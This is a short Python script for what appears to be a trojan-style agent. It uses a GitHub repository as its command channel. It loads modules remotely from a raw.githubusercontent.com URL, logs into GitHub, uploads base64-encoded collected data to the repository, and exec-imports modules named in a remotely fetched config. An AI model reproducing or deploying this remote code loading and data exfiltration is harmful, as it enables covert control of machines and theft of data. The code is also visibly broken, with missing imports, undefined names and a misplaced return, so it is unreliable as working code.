#!/usr/bin/env python
from github3 import login
from httpimp import add_remote_repo
add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')


class Boy(object):
    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/config/'

    def __init__(self, guser, gpass, repo):
        self._id = 'abc'
        self.configured = False
        self._modules = []
        self.task_queue = Queue.Queue()
        self.gh = self.repo = self.branch = None
        self.connect(guser, gpass, repo)

    def connect(self, u, p, repo):
        self.gh = login(username=u, password=p)
        self.repo = self.gh.repository(u, repo)
        self.branch = self.repo.branch('master')
        return

    def save_result(self, data, msg):
        remote_path = 'data/%s/%d.data' % (self._id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, msg, base64.b64encode(data))
    return

    def get_config(self):
        config_json = get_file_contents(_config)
        config = json.loads(base64.b64decode(config_json))
        configured = True

        for task in config:
            if task['module'] not in sys.modules:
                exec('import %s' % task['module'])

        return config



